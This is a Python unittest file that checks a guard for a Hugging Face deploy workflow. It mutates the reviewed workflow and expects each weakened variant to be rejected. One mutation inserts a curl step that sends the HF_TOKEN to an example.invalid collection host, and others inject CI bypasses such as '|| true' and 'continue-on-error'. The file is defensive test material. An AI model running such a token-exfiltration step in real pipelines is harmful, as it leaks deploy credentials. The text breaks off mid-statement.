from __future__ import annotations

# SPDX-License-Identifier: Apache-2.0
# © 2026 Lutar, Stephen P. — SZL Holdings
# Signed-off-by: Stephen P. Lutar Jr. <stephenlutar2@gmail.com>

import importlib.util
import json
import pathlib
import re
import shlex
import sys
import textwrap
import unittest
from unittest import mock


ROOT = pathlib.Path(__file__).resolve().parents[1]
CHECKER_PATH = ROOT / "tools" / "check_copy_sync_lockstep.py"
SPEC = importlib.util.spec_from_file_location("check_copy_sync_lockstep", CHECKER_PATH)
assert SPEC and SPEC.loader
CHECKER = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(CHECKER)

UNFILTERED_MAIN_PUSH = textwrap.dedent(
    """
    on:
      push:
        branches: [main]
    permissions:
      contents: read
    concurrency:
      group: sync-relock-canonical-a11oy
      cancel-in-progress: false
    env:
      GH_TOKEN: ${{ github.token }}
      CANONICAL_SPACE: SZLHOLDINGS/a11oy
      CANONICAL_ORIGIN: https://szlholdings-a11oy.hf.space
      REPORT_PATH: reports/canonical-a11oy-relock-v4.json
    """
)


class SourceDerivedCopySyncTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.reviewed_workflow = (ROOT / ".github/workflows/hf-sync.yml").read_text(encoding="utf-8")
        cls.ownership = (ROOT / "scripts/hf_exact_main_ownership.py").read_bytes()
        # Independent list of the deploy graph's local helper closure.
        cls.deploy_helpers = {path: (ROOT / path).read_bytes() for path in (
            ".github/scripts/resume_hf_space.py",
            ".github/scripts/await_hf_runtime_serving.py",
            "scripts/configure_hf_series_a_runtime.py",
            "scripts/configure_hf_gdw_runtime.py",
            "scripts/verify_installed_authority.py",
            "ayllu/keys/council-runtime-2026-07-21.pub",
            "szl_dsse.py",
            "a11oy_signing_key.py",
            ".github/scripts/verify_platform_candidate_preview.py",
            "scripts/witness_platform_candidate_preview.py",
            ".github/requirements/platform-candidate-browser.txt",
            ".github/scripts/publish_readiness_verdict.py",
            "tools/readiness-harness/probe_runner.mjs",
            "tools/readiness-harness/canonical_unavailable.mjs",
            "tools/readiness-harness/tabs.json",
            ".github/scripts/verify_canonical_a11oy.py",
            ".github/scripts/collect_execution_readiness.py",
            ".github/scripts/admit_execution_handoff.py",
            ".github/scripts/materialize_execution_authority_pins.py",
            "szl_execution_readiness.py",
            "observer_adapters.py",
            "tools/__init__.py",
            "tools/execution_acceptance.py",
        )}
        cls.deploy_needs = "[source-admission, preflight]"
        cls.deploy_if = "${{ needs.source-admission.outputs.publish == 'true' && needs.preflight.result == 'success' && needs.preflight.outputs.publish == 'true' }}"

    @classmethod
    def fixture_job(cls, name: str) -> str:
        # Independent fixture extraction; never reuse the guard's YAML parser.
        jobs = cls.reviewed_workflow.split("\njobs:\n", 1)[1]
        starts = list(re.finditer(r"^  ([A-Za-z0-9_-]+):\s*$", jobs, re.MULTILINE))
        matches = [i for i, match in enumerate(starts) if match.group(1) == name]
        if len(matches) != 1:
            raise AssertionError("Expected one reviewed fixture job: " + name)
        index = matches[0]
        end = starts[index + 1].start() if index + 1 < len(starts) else len(jobs)
        return jobs[starts[index].start():end].rstrip() + "\n"

    def strict_contract(self, workflow: str, **overrides) -> bool:
        inputs = {"ownership_helper": self.ownership, "deploy_helpers": self.deploy_helpers}
        inputs.update(overrides)
        return CHECKER.has_source_derived_deploy_contract(workflow, **inputs)

    def fixture_contract(self, workflow: str, **inputs) -> bool:
        # Existing controller/COPY/trigger fixtures now use the reviewed graph.
        # Actual workflow and bypass mutations use strict_contract unchanged.
        synthetic = "\n  source-admission:\n" not in workflow
        if synthetic:
            if "\npermissions:\n" not in workflow:
                inherited = textwrap.dedent(
                    """
                    permissions:
                      contents: read
                    concurrency:
                      group: sync-relock-canonical-a11oy
                      cancel-in-progress: false
                    env:
                      GH_TOKEN: ${{ github.token }}
                      CANONICAL_SPACE: SZLHOLDINGS/a11oy
                      CANONICAL_ORIGIN: https://szlholdings-a11oy.hf.space
                      REPORT_PATH: reports/canonical-a11oy-relock-v4.json
                    """
                )
                workflow = workflow.replace("\njobs:\n", "\n" + inherited + "jobs:\n", 1)
            jobs = "".join(self.fixture_job(name) + "\n" for name in (
                "source-admission", "preflight", "runtime-config", "execution-handoff",
                "readiness-verdict", "execution-readiness", "relock"))
            workflow = workflow.replace("\njobs:\n", "\njobs:\n" + jobs, 1)
            workflow = workflow.replace("\n  deploy:\n", "\n  deploy:\n"
                + "    needs: " + self.deploy_needs + "\n"
                + "    if: " + self.deploy_if + "\n", 1)
            deploy_match = re.search(
                r"(?ms)^  deploy:\n.*?(?=^  [A-Za-z0-9_-]+:\n|\Z)", workflow
            )
            if deploy_match:
                block = deploy_match.group(0)
                if not re.search(r"(?m)^    name:", block):
                    block = block.replace(
                        "  deploy:\n",
                        "  deploy:\n"
                        "    name: Deploy, source-bind, and attest exact surface\n",
                        1,
                    )
                if not re.search(r"(?m)^    permissions:", block):
                    block = block.replace("  deploy:\n", "  deploy:\n"
                        "    permissions:\n      contents: read\n"
                        "      id-token: write\n      attestations: write\n", 1)
                reviewed = self.fixture_job("deploy")
                reviewed_with = reviewed.split("    with:\n", 1)[1].split(
                    "    secrets:\n", 1
                )[0]
                expected_rows = [
                    line for line in reviewed_with.splitlines()
                    if re.match(r"^      [A-Za-z_][A-Za-z0-9_-]*:", line)
                ]
                present = {
                    match.group(1)
                    for match in re.finditer(
                        r"(?m)^      ([A-Za-z_][A-Za-z0-9_-]*):", block
                    )
                }
                missing = [
                    line for line in expected_rows
                    if line.strip().split(":", 1)[0] not in present
                    and line.strip().split(":", 1)[0]
                    not in {"hf-repo", "ref", "dockerfile-path"}
                ]
                if missing and "    with:\n" in block:
                    block = block.replace(
                        "    with:\n", "    with:\n" + "\n".join(missing) + "\n", 1
                    )
                if not re.search(r"(?m)^    secrets:", block):
                    block = block.rstrip() + (
                        "\n    secrets:\n"
                        "      HF_TOKEN: ${{ secrets.HF_ORG_TOKEN || secrets.HF_TOKEN }}\n"
                    )
                workflow = (
                    workflow[:deploy_match.start()]
                    + block
                    + workflow[deploy_match.end():]
                )
            inputs.setdefault("ownership_helper", self.ownership)
        inputs.setdefault("deploy_helpers", self.deploy_helpers)
        return CHECKER.has_source_derived_deploy_contract(workflow, **inputs)

    def test_reviewed_workflow_is_recognized(self) -> None:
        self.assertTrue(self.strict_contract(self.reviewed_workflow))

    def test_identity_permissions_and_opt_in_are_exact(self) -> None:
        mutations = (
            ("      runtime-identity: true", "      runtime-identity: false"),
            ("      runtime-identity: true\n", ""),
            ("      id-token: write", "      id-token: read"),
            ("      attestations: write", "      attestations: read"),
            ("      attestations: write", "      attestations: write\n      contents: write"),
            ("      attestations: write", "      attestations: write\n      actions: write"),
        )
        for before, after in mutations:
            with self.subTest(after=after):
                self.assertIn(before, self.reviewed_workflow)
                self.assertFalse(self.strict_contract(self.reviewed_workflow.replace(before, after, 1)))

    def test_inherited_provider_context_is_exact_and_has_no_run_defaults(self) -> None:
        mutations = (
            ("  CANONICAL_SPACE: SZLHOLDINGS/a11oy",
             "  CANONICAL_SPACE: OTHER/a11oy"),
            ("  CANONICAL_ORIGIN: https://szlholdings-a11oy.hf.space",
             "  CANONICAL_ORIGIN: https://example.invalid"),
            ("  GH_TOKEN: ${{ github.token }}", "  GH_TOKEN: forged"),
            ("  REPORT_PATH: reports/canonical-a11oy-relock-v4.json",
             "  REPORT_PATH: /tmp/forged.json"),
            ("permissions:\n  contents: read",
             "permissions:\n  contents: write"),
            ("  group: sync-relock-canonical-a11oy",
             "  group: arbitrary-provider-writes"),
            ("  cancel-in-progress: false", "  cancel-in-progress: true"),
            ("\nenv:\n", "\ndefaults:\n  run:\n    shell: bash {0} || true\nenv:\n"),
            ("\nenv:\n", "\ndefaults:\n  run:\n    working-directory: unreviewed\nenv:\n"),
            ("  CANONICAL_SPACE: SZLHOLDINGS/a11oy\n",
             "  CANONICAL_SPACE: SZLHOLDINGS/a11oy\n"
             "  CANONICAL_SPACE: OTHER/a11oy\n"),
            ("\nenv:\n", "\nenv: *unreviewed\n"),
            ("\nenv:\n", "\nenv:\n  <<: *unreviewed\n"),
        )
        for before, after in mutations:
            with self.subTest(after=after):
                self.assertIn(before, self.reviewed_workflow)
                self.assertFalse(self.strict_contract(
                    self.reviewed_workflow.replace(before, after, 1)))

    def test_provider_workflow_event_scope_is_exact(self) -> None:
        anchor = "\npermissions:\n"
        self.assertIn(anchor, self.reviewed_workflow)
        additions = (
            "  pull_request_target:\n    branches: [main]\n",
            "  schedule:\n    - cron: '0 3 * * *'\n",
            "  repository_dispatch:\n    types: [deploy]\n",
        )
        for addition in additions:
            with self.subTest(addition=addition):
                changed = self.reviewed_workflow.replace(
                    anchor, "\n" + addition + "permissions:\n", 1
                )
                self.assertFalse(self.strict_contract(changed))

        changed_default = self.reviewed_workflow.replace(
            "      open_deploy_window:\n"
            "        description: Operator-attested maintenance window. Until durable storage lands, a deploy onto a running or crashed Space proceeds only when true (a PAUSED Space is itself the window).\n"
            "        type: boolean\n"
            "        default: false\n",
            "      open_deploy_window:\n"
            "        description: Operator-attested maintenance window. Until durable storage lands, a deploy onto a running or crashed Space proceeds only when true (a PAUSED Space is itself the window).\n"
            "        type: boolean\n"
            "        default: true\n",
            1,
        )
        self.assertNotEqual(changed_default, self.reviewed_workflow)
        self.assertFalse(self.strict_contract(changed_default))

    def test_ungated_and_source_only_deploy_cannot_bypass_preflight(self) -> None:
        workflow = self.reviewed_workflow
        needs = "    needs: " + self.deploy_needs + "\n"
        condition = "    if: " + self.deploy_if + "\n"
        self.assertIn(needs, workflow)
        self.assertIn(condition, workflow)
        ungated = workflow.replace(needs, "", 1).replace(condition, "", 1)
        self.assertFalse(self.strict_contract(ungated))
        source_only = workflow.replace(needs, "    needs: source-admission\n", 1).replace(
            condition, "    if: ${{ needs.source-admission.outputs.publish == 'true' }}\n", 1)
        self.assertFalse(self.strict_contract(source_only))

    def test_missing_extra_duplicate_or_reordered_deploy_dependencies_fail(self) -> None:
        for value in ("[source-admission]", "[preflight]", "[]",
                      "[preflight, source-admission]",
                      "[source-admission, preflight, arbitrary]",
                      "[source-admission, preflight, source-admission]",
                      "[source-admission, preflight, manual-prerequisites]",
                      "[source-admission, preflight, durable-acquisition]"):
            with self.subTest(value=value):
                self.assertFalse(self.strict_contract(self.reviewed_workflow.replace(self.deploy_needs, value, 1)))
        self.assertFalse(self.strict_contract(self.reviewed_workflow.replace(
            "    needs: " + self.deploy_needs + "\n", "", 1)))

    def test_missing_or_bypassed_deploy_success_condition_fails(self) -> None:
        for value in ("true", "false", "always()",
                      "${{ always() && needs.source-admission.outputs.publish == 'true' }}",
                      "${{ needs.source-admission.outputs.publish == 'true' }}",
                      "${{ needs.source-admission.outputs.publish == 'true' && needs.preflight.result == 'success' }}",
                      "${{ github.run_attempt == 1 && needs.source-admission.outputs.publish == 'true' && needs.preflight.result == 'success' && needs.preflight.outputs.publish == 'true' }}"):
            with self.subTest(value=value):
                self.assertFalse(self.strict_contract(self.reviewed_workflow.replace(self.deploy_if, value, 1)))
        self.assertFalse(self.strict_contract(self.reviewed_workflow.replace(
            "    if: " + self.deploy_if + "\n", "", 1)))

    def test_each_deploy_helper_is_byte_bound(self) -> None:
        for path in self.deploy_helpers:
            with self.subTest(path=path):
                changed = dict(self.deploy_helpers)
                changed[path] += b"\n# changed deploy-path implementation\n"
                self.assertFalse(self.strict_contract(self.reviewed_workflow, deploy_helpers=changed))
                del changed[path]
                self.assertFalse(self.strict_contract(self.reviewed_workflow, deploy_helpers=changed))

    def test_missing_malformed_or_extra_deploy_helper_bindings_fail(self) -> None:
        for helpers in (None, {}, {**self.deploy_helpers, "scripts/unknown.py": b""},
                        {**self.deploy_helpers, "scripts/configure_hf_gdw_runtime.py": "not bytes"}):
            self.assertFalse(self.strict_contract(self.reviewed_workflow, deploy_helpers=helpers))
        self.assertTrue(self.strict_contract(self.reviewed_workflow, deploy_helpers={
            path: data.replace(b"\n", b"\r\n") for path, data in self.deploy_helpers.items()}))

    def test_preflight_cannot_gain_a_restart_retry_bypass_or_lose_admission(self) -> None:
        job = self.fixture_job("preflight")
        mutations = (
            ("    needs: source-admission\n", "    needs: []\n"),
            ("needs.source-admission.outputs.publish == 'true'", "true"),
            ("needs.source-admission.result == 'success' && ", "github.run_attempt == 1 && needs.source-admission.result == 'success' && "),
            ("    runs-on:", "    continue-on-error: true\n    runs-on:"),
            ("python -I -B .github/scripts/resume_hf_space.py", "python -B .github/scripts/resume_hf_space.py"),
            ("python -I -m pip install --disable-pip-version-check",
             "python -m pip install --disable-pip-version-check"),
            ('--github-output "$GITHUB_OUTPUT"\n', '--github-output "$GITHUB_OUTPUT" --restart\n'),
            ("echo 'converged=true' >> \"$GITHUB_OUTPUT\"", "echo 'converged=false' >> \"$GITHUB_OUTPUT\""),
            ("scripts/hf_exact_main_ownership.py", "scripts/unreviewed_ownership.py"),
            ("      publish: ${{ steps.window.outputs.open == 'true' && steps.owner.outputs.publish == 'true' }}",
             "      publish: ${{ steps.owner.outputs.publish == 'true' }}"),
            # The deploy window cannot be forced open.
            ("if [ \"${STAGE:-}\" = 'PAUSED' ] ||", "if true ||"),
            # Convergence cannot run before main is admitted or with the window shut.
            ("        id: converge\n        if: ${{ steps.window.outputs.open == 'true' }}\n",
             "        id: converge\n"),
            ("        id: runtime\n        if: ${{ steps.admit.outputs.publish == 'true' }}\n",
             "        id: runtime\n"),
            ("      restart_required: ${{ steps.runtime.outputs.restart_required }}", "      restart_required: 'true'"),
            ('"huggingface_hub==1.31.0"', '"huggingface_hub"'),
            ("          persist-credentials: false\n", "          persist-credentials: true\n"),
        )
        for before, after in mutations:
            with self.subTest(after=after):
                self.assertIn(before, job)
                changed = self.reviewed_workflow.replace(job, job.replace(before, after, 1), 1)
                self.assertFalse(self.strict_contract(changed))

    def test_runtime_config_cannot_gain_a_restart_proof_or_skip_verification(self) -> None:
        job = self.fixture_job("runtime-config")
        mutations = (
            ("    needs: [preflight, deploy]\n", "    needs: deploy\n"),
            ("    needs: [preflight, deploy]\n", "    needs: [preflight, deploy]\n    if: ${{ always() }}\n"),
            ("mode=(--check-only)", "mode=(--check-only --skip-authority)"),
            ("set -euo pipefail", "set +e"),
            ("scripts/configure_hf_gdw_runtime.py", "scripts/prove_hf_gdw_runtime.py"),
            ('            "${mode[@]}" --output "$GDW_CONFIG_REPORT"\n',
             '            "${mode[@]}" --output "$GDW_CONFIG_REPORT"\n          python -B scripts/prove_hf_series_a_restart.py --source-sha "$GITHUB_SHA" --output /tmp/proof.json\n'),
            ("            ${{ env.GDW_CONFIG_REPORT }}\n", "            ${{ runner.temp }}/**\n"),
            ("python -I -B .github/scripts/await_hf_runtime_serving.py", "true"),
            ("python -I -B .github/scripts/await_hf_runtime_serving.py",
             "python -B .github/scripts/await_hf_runtime_serving.py"),
        )
        for before, after in mutations:
            with self.subTest(after=after):
                self.assertIn(before, job)
                changed = self.reviewed_workflow.replace(job, job.replace(before, after, 1), 1)
                self.assertFalse(self.strict_contract(changed))

    def test_readiness_verifier_is_exact_and_has_no_provider_credential(self) -> None:
        job = self.fixture_job("readiness-verdict")
        self.assertNotIn("HF_TOKEN", job)
        self.assertNotIn("secrets.", job)
        mutations = (
            ("    needs: execution-handoff\n", "    needs: deploy\n"),
            ("    runs-on: ubuntu-latest\n",
             "    continue-on-error: true\n    runs-on: ubuntu-latest\n"),
            ("      contents: read\n", "      contents: write\n"),
            ("          ref: ${{ github.sha }}\n", "          ref: main\n"),
            ("          persist-credentials: false\n",
             "          persist-credentials: true\n"),
            ("python -I -B .github/scripts/verify_platform_candidate_preview.py",
             "python -B .github/scripts/verify_platform_candidate_preview.py"),
            ("python -I -B .github/scripts/verify_platform_candidate_preview.py",
             "python -I -B scripts/unreviewed_candidate_probe.py"),
            ("--expected-contract-file serve.py",
             "--expected-source-revision deadbeef"),
            ('--base-url "https://a-11-oy.com"',
             '--base-url "https://example.invalid"'),
            ("    env:\n", "    env:\n      HF_TOKEN: ${{ secrets.HF_TOKEN }}\n"),
        )
        for before, after in mutations:
            with self.subTest(after=after):
                self.assertIn(before, job)
                changed = self.reviewed_workflow.replace(
                    job, job.replace(before, after, 1), 1)
                self.assertFalse(self.strict_contract(changed))

    def test_readiness_success_is_required_before_relock(self) -> None:
        job = self.fixture_job("relock")
        exact = "    needs: [execution-handoff, execution-readiness]\n"
        self.assertIn(exact, job)
        replacements = (
            "    needs: execution-handoff\n",
            "    needs: execution-readiness\n",
            "    needs: [execution-readiness, execution-handoff]\n",
            exact + "    if: ${{ always() }}\n",
            exact + "    continue-on-error: true\n",
            exact + "    <<: *unreviewed\n",
            exact + '    "\\u0069f": ${{ always() }}\n',
            exact + '    "\\x69f": ${{ always() }}\n',
        )
        for replacement in replacements:
            with self.subTest(replacement=replacement):
                changed = self.reviewed_workflow.replace(
                    job, job.replace(exact, replacement, 1), 1)
                self.assertFalse(self.strict_contract(changed))

    def test_execution_collection_cannot_gain_effects_or_cross_job_credentials(self) -> None:
        job = self.fixture_job("execution-readiness")
        self.assertNotIn("HF_TOKEN", job)
        mutations = (
            ("    needs: [readiness-verdict, execution-handoff]\n", "    needs: runtime-config\n"),
            ("    needs: [readiness-verdict, execution-handoff]\n", "    needs: [readiness-verdict, execution-handoff]\n    if: ${{ always() }}\n"),
            ("    env:\n", "    env:\n      A11OY_CODE_ADMIN_KEY: ${{ secrets.A11OY_CODE_ADMIN_KEY }}\n"),
            ("      actions: read\n", "      actions: write\n"),
            ("python -I -B .github/scripts/collect_execution_readiness.py",
             "python -I -B scripts/execute_acceptance_plan.py"),
            ("python -I -B .github/scripts/collect_execution_readiness.py",
             "python -B .github/scripts/collect_execution_readiness.py"),
            ("          A11OY_CODE_ADMIN_KEY: ${{ secrets.A11OY_CODE_ADMIN_KEY }}\n",
             "          A11OY_CODE_ADMIN_KEY: ${{ secrets.HF_TOKEN }}\n"),
            ("canonical-a11oy-passive-${{ github.run_id }}-${{ github.run_attempt }}",
             "canonical-a11oy-passive-${{ github.run_id }}-1"),
            ("            ${{ runner.temp }}/execution-evidence/execution-observations.json\n",
             "            ${{ runner.temp }}/execution-evidence/**\n"),
            ("      EXPECTED_EXECUTION_BOOT_ID: ${{ needs.execution-handoff.outputs.boot_id }}\n",
             "      EXPECTED_EXECUTION_BOOT_ID: ${{ steps.gate.outputs.boot_id }}\n"),
            ("          --validate-only\n", ""),
            ("          --expected-run-nonce \"$EXPECTED_EXECUTION_RUN_NONCE\"\n",
             "          --expected-run-nonce \"$EXPECTED_EXECUTION_RUN_NONCE\" || true\n"),
        )
        for original, replacement in mutations:
            with self.subTest(replacement=replacement):
                self.assertIn(original, job)
                changed = self.reviewed_workflow.replace(job, job.replace(original, replacement, 1), 1)
                self.assertFalse(self.strict_contract(changed))

    def test_verification_input_and_invocation_cannot_enable_provider_effects(self) -> None:
        block = re.search(
            r"(?ms)^      verify_current_deployment:\n.*?(?=^      [A-Za-z0-9_-]+:\n|\Z)",
            self.reviewed_workflow,
        ).group(0)
        for original, replacement in (("type: boolean", "type: string"),
                                      ("default: false", "default: true")):
            with self.subTest(replacement=replacement):
                changed = self.reviewed_workflow.replace(block, block.replace(original, replacement), 1)
                self.assertFalse(self.strict_contract(changed))
        mutations = (
            ("--validate-invocation", "--unreviewed-mode"),
            ("          OPEN_DEPLOY_WINDOW: ${{ inputs.open_deploy_window || false }}\n", ""),
            ("          PUBLISH_VERTICAL_FLAGSHIPS: ${{ inputs.publish_vertical_flagships || false }}\n", ""),
            ("          VERTICAL_PLAN_JSON: ${{ inputs.vertical_plan_json }}\n", ""),
            ("!inputs.verify_current_deployment && ", ""),
        )
        for original, replacement in mutations:
            with self.subTest(replacement=replacement):
                self.assertIn(original, self.reviewed_workflow)
                self.assertFalse(self.strict_contract(self.reviewed_workflow.replace(original, replacement, 1)))

    def test_handoff_cannot_gain_credentials_execute_or_skip_independent_admission(self) -> None:
        job = self.fixture_job("execution-handoff")
        self.assertNotIn("secrets.", job)
        self.assertNotIn("HF_TOKEN", job)
        mutations = (
            ("    needs: [source-admission, runtime-config]\n", "    needs: source-admission\n"),
            ("needs.runtime-config.result == 'skipped'", "needs.runtime-config.result != 'success'"),
            ("needs.source-admission.result == 'success'", "true"),
            ("github.event_name == 'workflow_dispatch'", "true"),
            ("needs.runtime-config.result == 'success'", "true"),
            ("    permissions:\n", "    env:\n      HF_TOKEN: ${{ secrets.HF_TOKEN }}\n    permissions:\n"),
            ("      contents: read\n", "      contents: write\n"),
            ('--source-sha "$GITHUB_SHA"', "--source-sha main"),
            (".github/scripts/admit_execution_handoff.py", "scripts/execute_acceptance_plan.py"),
            ('--output "$RUNNER_TEMP/execution-handoff.json"', '--output "$RUNNER_TEMP/execution-handoff.json" --execute'),
            ("grep -Fqx 'publish=true'", "true # grep -Fqx 'publish=true'"),
            ("${{ vars.A11OY_EXECUTION_BOOT_ID }}", "${{ steps.context.outputs.boot_id }}"),
            ("    outputs:\n", "    continue-on-error: true\n    outputs:\n"),
        )
        for original, replacement in mutations:
            with self.subTest(replacement=replacement):
                self.assertIn(original, job)
                changed = self.reviewed_workflow.replace(job, job.replace(original, replacement, 1), 1)
                self.assertFalse(self.strict_contract(changed))

    def test_downstream_jobs_cannot_reread_mutable_execution_context(self) -> None:
        for name in ("execution-readiness", "relock"):
            job = self.fixture_job(name)
            for output, variable in (("hf_revision", "HF_REVISION"), ("boot_id", "BOOT_ID"),
                                     ("run_nonce", "RUN_NONCE"), ("authority_pins", "AUTHORITY_PINS_JSON")):
                original = f"${{{{ needs.execution-handoff.outputs.{output} }}}}"
                replacement = f"${{{{ vars.A11OY_EXECUTION_{variable} }}}}"
                with self.subTest(job=name, output=output):
                    self.assertIn(original, job)
                    changed = self.reviewed_workflow.replace(job, job.replace(original, replacement, 1), 1)
                    self.assertFalse(self.strict_contract(changed))

    def test_escaped_push_filter_keys_cannot_hide_from_the_guard(self) -> None:
        anchor = "    branches: [main]\n"
        self.assertIn(anchor, self.reviewed_workflow)
        additions = (
            '    "\\u0070aths": [README.md]\n',
            '    "\\x70aths": [README.md]\n',
            "    ? paths\n    : [README.md]\n",
            "    &filter paths: [README.md]\n",
        )
        for addition in additions:
            with self.subTest(addition=addition):
                changed = self.reviewed_workflow.replace(
                    anchor, anchor + addition, 1
                )
                self.assertFalse(self.strict_contract(changed))

    def test_retired_incident_jobs_cannot_reenter_the_graph(self) -> None:
        for name in ("recovery-reconciliation", "manual-prerequisites", "durable-acquisition",
                     "resume-paused-space", "publish-finance-projection"):
            with self.subTest(job=name):
                retired = "  " + name + ":\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo retired\n"
                self.assertFalse(self.strict_contract(self.reviewed_workflow.rstrip("\n") + "\n\n" + retired))

    def test_missing_duplicate_jobs_and_duplicate_controller_fields_fail(self) -> None:
        for name in ("source-admission", "preflight", "runtime-config", "execution-handoff",
                     "readiness-verdict", "execution-readiness", "relock", "deploy"):
            job = self.fixture_job(name)
            self.assertFalse(self.strict_contract(self.reviewed_workflow.replace(job, "", 1)))
            self.assertFalse(self.strict_contract(self.reviewed_workflow + "\n" + job))
        escaped_relock = self.fixture_job("relock").replace(
            "  relock:\n", '  "\\u0072elock":\n', 1
        )
        self.assertFalse(self.strict_contract(
            self.reviewed_workflow + "\n" + escaped_relock))
        deploy = self.fixture_job("deploy")
        for header in ("    needs: " + self.deploy_needs + "\n", "    if: " + self.deploy_if + "\n",
                       "    uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36\n",
                       "    <<: *hidden\n", "    continue-on-error: true\n",
                       "    ? continue-on-error\n    : true\n",
                       "    &bypass continue-on-error: true\n"):
            self.assertFalse(self.strict_contract(self.reviewed_workflow.replace(deploy,
                deploy.replace("  deploy:\n", "  deploy:\n" + header, 1), 1)))

    def test_deploy_authority_scope_is_exact(self) -> None:
        deploy = self.fixture_job("deploy")
        secret = (
            "    secrets:\n"
            "      HF_TOKEN: ${{ secrets.HF_ORG_TOKEN || secrets.HF_TOKEN }}\n"
        )
        self.assertIn(secret, deploy)
        mutations = (
            deploy.replace(secret, "    secrets: inherit\n", 1),
            deploy.replace(
                secret,
                secret + "      EXTRA: ${{ secrets.EXTRA_SECRET }}\n",
                1,
            ),
            deploy.replace("  deploy:\n", "  deploy:\n    permissions:\n      contents: write\n", 1),
            deploy.replace("  deploy:\n", "  deploy:\n    environment: production\n", 1),
            deploy.replace("  deploy:\n", "  deploy:\n    timeout-minutes: 1440\n", 1),
            deploy.replace(
                "      include-readme: true\n",
                "      include-readme: true\n      unreviewed-effect: true\n",
                1,
            ),
        )
        for changed_deploy in mutations:
            with self.subTest(changed=changed_deploy):
                changed = self.reviewed_workflow.replace(deploy, changed_deploy, 1)
                self.assertFalse(self.strict_contract(changed))

    def test_relock_credential_scope_is_exact(self) -> None:
        relock = self.fixture_job("relock")
        mutations = (
            relock.replace(
                "  relock:\n", "  relock:\n    permissions:\n      contents: write\n", 1
            ),
            relock.replace(
                "      SOURCE_SHA: ${{ github.sha }}\n",
                "      SOURCE_SHA: ${{ github.sha }}\n"
                "      EXTRA: ${{ secrets.EXTRA_SECRET }}\n",
                1,
            ),
            relock.replace(
                "    steps:\n",
                "    steps:\n"
                "      - run: curl -fsS -H \"authorization: Bearer $HF_TOKEN\" "
                "https://example.invalid/collect\n",
                1,
            ),
        )
        for changed_relock in mutations:
            with self.subTest(changed=changed_relock):
                changed = self.reviewed_workflow.replace(relock, changed_relock, 1)
                self.assertFalse(self.strict_contract(changed))

    def test_exact_reviewed_source_admission_preserves_copy_coverage(self) -> None:
        workflow = (ROOT / ".github/workflows/hf-sync.yml").read_text(encoding="utf-8")
        helper = (ROOT / "scripts/hf_exact_main_ownership.py").read_bytes()
        self.assertTrue(self.fixture_contract(
            workflow, ownership_helper=helper))
        self.assertFalse(self.fixture_contract(workflow))

    def test_public_hf_inventory_docs_enter_runtime_and_space_copy_set(self) -> None:
        dockerfile = (ROOT / "Dockerfile").read_text(encoding="utf-8")
        runtime = dockerfile.split(" AS runtime\n", 1)[1]
        copies = [shlex.split(instruction) for instruction in CHECKER.logical_lines(runtime)
                  if re.match(r"^COPY\s+", instruction)]
        for source in (
            "docs/huggingface-ecosystem-manifest.json",
            "docs/huggingface-ecosystem-manifest.schema.json",
            "docs/huggingface.md",
        ):
            with self.subTest(source=source):
                self.assertTrue((ROOT / source).is_file())
                destinations = [tokens[-1] for tokens in copies if source in tokens[1:-1]]
                self.assertEqual(["./docs/"], destinations)
        self.assertTrue(self.strict_contract(self.reviewed_workflow))

    def test_source_admission_cannot_hide_changed_helper_or_arbitrary_skip(self) -> None:
        workflow = (ROOT / ".github/workflows/hf-sync.yml").read_text(encoding="utf-8")
        helper = (ROOT / "scripts/hf_exact_main_ownership.py").read_bytes()
        changes = (
            (workflow, helper + b"\n# changed ownership implementation\n"),
            (workflow.replace("publish: ${{ steps.owner.outputs.publish }}", "publish: false"), helper),
            (workflow.replace("--expected-sha \"$GITHUB_SHA\"", "--expected-sha main"), helper),
            (workflow.replace("needs: source-admission", "needs: arbitrary-gate"), helper),
            (workflow.replace("needs.source-admission.outputs.publish == 'true'", "false"), helper),
            (workflow.replace("require-default-branch-tip: true", "require-default-branch-tip: false"), helper),
            (workflow.replace("needs: source-admission", "needs: source-admission\n    needs: skipped"), helper),
            (workflow.replace("  source-admission:\n", "  source-admission:\n    if: false\n"), helper),
            (workflow.replace("      require-default-branch-tip: true", "      require-default-branch-tip: true\n      contract-only: true"), helper),
            (workflow.replace("      require-default-branch-tip: true", "      require-default-branch-tip: true\n      contract-only: false\n      contract-only: true"), helper),
        )
        for changed, changed_helper in changes:
            with self.subTest(change=changed != workflow, helper=changed_helper != helper):
                self.assertFalse(self.fixture_contract(
                    changed, ownership_helper=changed_helper))

    def test_contract_only_cannot_supply_unconditional_copy_coverage(self) -> None:
        workflow = UNFILTERED_MAIN_PUSH + textwrap.dedent(
            """
            jobs:
              deploy:
                uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
                with:
                  hf-repo: SZLHOLDINGS/a11oy
                  ref: ${{ github.sha }}
                  dockerfile-path: Dockerfile
            """
        )
        self.assertTrue(self.fixture_contract(
            workflow + "      contract-only: false\n"))
        self.assertFalse(self.fixture_contract(
            workflow + "      contract-only: true\n"))
        self.assertFalse(self.fixture_contract(
            workflow + "      contract-only: false\n      contract-only: true\n"))

    def test_pinned_dockerfile_deployer_is_recognized(self) -> None:
        workflow = UNFILTERED_MAIN_PUSH + textwrap.dedent(
            """
            jobs:
              deploy:
                uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
                with:
                  hf-repo: SZLHOLDINGS/a11oy
                  ref: ${{ github.sha }}
                  dockerfile-path: Dockerfile
            """
        )
        self.assertTrue(self.fixture_contract(workflow))

    def test_unpinned_or_implicit_dockerfile_deployer_is_rejected(self) -> None:
        cases = (
            """
            jobs:
              deploy:
                uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@main
                with:
                  hf-repo: SZLHOLDINGS/a11oy
                  ref: ${{ github.sha }}
                  dockerfile-path: Dockerfile
            """,
            """
            jobs:
              deploy:
                uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@5f140bab8adb64fe25252d8832b67b1f43a56c36
            """,
            """
            jobs:
              deploy:
                uses: szl-holdings/.github/.github/workflows/reusable-hf-deploy.yml@1111111111111111111111111111111111111111
                with:
                  hf-repo: SZLHOLDINGS/a11oy
                  ref: ${{ github.sha }}
                  dockerfile-path: Dockerfile
            """,
        )
        for workflow in cases:
            with self.subTest(workflow=workflow):
                self.assertFalse(
